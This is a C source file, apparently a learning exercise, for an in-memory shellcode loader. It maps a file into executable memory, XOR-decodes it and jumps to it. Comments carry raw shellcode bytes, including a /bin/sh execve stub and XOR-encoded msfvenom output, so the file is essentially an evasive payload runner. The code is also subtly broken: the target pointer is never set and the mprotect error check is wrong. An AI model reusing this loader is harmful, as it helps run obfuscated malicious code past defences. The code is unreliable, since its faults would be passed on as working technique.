#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void* my_payload_mem; 
void* my_payload_dest;

int main() {

    FILE *f;
    size_t len;
    void *my_payload_mem;

    // 1. OPEN THE FILE
    f = fopen("payload.bin", "rb");
    if (f == NULL) {
        perror("File open error");
        return 1;
    }

    // 2. GET FILE SIZE
    // Trick: Go to the end, ask position, go back to start.
    fseek(f, 0, SEEK_END);
    len = ftell(f);
    rewind(f);

    printf("Payload size found: %ld bytes\n", len);

    // call the function here, when the program is running.
    my_payload_mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    // Check for success
    if (my_payload_mem == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    printf("Memory allocated at: %p\n", my_payload_mem);

    // canned shellcode maybe write my own
    // unsigned char shellcode[] = "\xe2\x12\x85\xc8\xc3\xc4\x85\xd9\xc2\xaa\x33\xfa\xfe\xf5\xf8\xcc\xc2\x87\xc9\xfe\xf4\xf8\x42\xbb\xaa\xaa\xaa\xcf\xc9\xc2\xc5\x8a\xc2\xcf\xc6\xc6\xc5\x8a\xde\xc2\xcf\xd8\xcf\xaa\xfc\xfd\xfe\xf4\xc0\x91\xf2\xa5\xaf";

    // copy the shellcode to the allocated memory
    // my_payload_dest = memcpy(my_payload_mem, shellcode, sizeof(shellcode));

    fread(my_payload_mem, 1, len, f);

    printf("Shellcode copied succesfully to the allocated memory with memory destination at: %p\n", my_payload_dest);

    unsigned char* exec_ptr = (unsigned char*)my_payload_mem;

    fclose(f);
    
    // xor key
    unsigned char key = 0xAA; 

    // Loop through every byte and XOR it again
    for (int i = 0; i < len - 1; i++) { // -1 to skip the null terminator if string
        exec_ptr[i] = exec_ptr[i] ^ key;
    }

    int status = mprotect(my_payload_dest, len, PROT_READ | PROT_EXEC);

    if (status == 1) {
        perror("mprotect failed");
        return 1;
    }

    // create a funciton pointer
    void (*func_ptr)();

    // cast the void pointer to the function pointer
    *(void**)(&func_ptr) = my_payload_dest;

    // call the function pointer
    func_ptr();
    
    return 0;
}

// 1. Define a variable to hold the address
// 2. Call mmap
// Arg 1 (addr): NULL (Let the OS choose the address)
// Arg 2 (len):  The size in bytes (e.g., 4096)
// Arg 3 (prot): PROT_READ | PROT_WRITE | PROT_EXEC (The permissions)
// Arg 4 (flags): MAP_PRIVATE | MAP_ANONYMOUS (Not a file, private memory)
// Arg 5 (fd):   -1 (We aren't using a file)
// Arg 6 (offset): 0 (No offset needed)
// "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
// custom shellcode via msfvenom:
// "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x11\x00\x00\x00\x65\x63\x68\x6f\x20\x68\x65\x6c\x6c\x6f\x20\x74\x68\x65\x72\x65\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"
// encoded msfvenom payload "\xe2\x12\x85\xc8\xc3\xc4\x85\xd9\xc2\xaa\x33\xfa\xfe\xf5\xf8\xcc\xc2\x87\xc9\xfe\xf4\xf8\x42\xbb\xaa\xaa\xaa\xcf\xc9\xc2\xc5\x8a\xc2\xcf\xc6\xc6\xc5\x8a\xde\xc2\xcf\xd8\xcf\xaa\xfc\xfd\xfe\xf4\xc0\x91\xf2\xa5\xaf"